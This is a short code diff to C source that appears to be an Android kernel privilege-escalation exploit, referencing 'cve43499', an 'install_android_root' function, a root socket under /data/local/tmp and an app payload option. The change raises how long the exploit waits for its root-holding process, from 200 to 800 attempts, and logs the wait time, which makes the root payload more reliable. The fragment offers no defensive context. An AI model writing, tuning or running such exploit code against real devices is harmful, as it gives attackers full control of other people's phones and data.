@@ -9,6 +9,8 @@ uint32_t root_uid_after = 0xffffffff;
 
 #define ROOT_SOCKET_PATH "/data/local/tmp/temp_su.sock"
 #define ROOT_HOLD_READY_SOCKET "cve43499_roothold"
+#define ROOT_HOLD_READY_ATTEMPTS 800
+#define ROOT_HOLD_READY_DELAY_USEC 10000
 
 struct umh_subprocess_info {
   uint8_t work[48];
@@ -306,14 +308,16 @@ int install_android_root(int fd) {
 #if defined(APP_PAYLOAD) && APP_PAYLOAD
   if (installed) {
     int holder_ready = 0;
-    for (int attempt = 0; attempt < 200; attempt++) {
+    for (int attempt = 0; attempt < ROOT_HOLD_READY_ATTEMPTS; attempt++) {
       if (root_hold_socket_ready()) {
         holder_ready = 1;
         break;
       }
-      usleep(10000);
+      usleep(ROOT_HOLD_READY_DELAY_USEC);
     }
-    pr_info("root p0 reference holder ready=%d\n", holder_ready);
+    pr_info("root p0 reference holder ready=%d waited_ms=%d\n",
+            holder_ready,
+            ROOT_HOLD_READY_ATTEMPTS * ROOT_HOLD_READY_DELAY_USEC / 1000);
     if (!holder_ready) {
       root_child_done = 0;
       root_uid_after = root_uid_before;
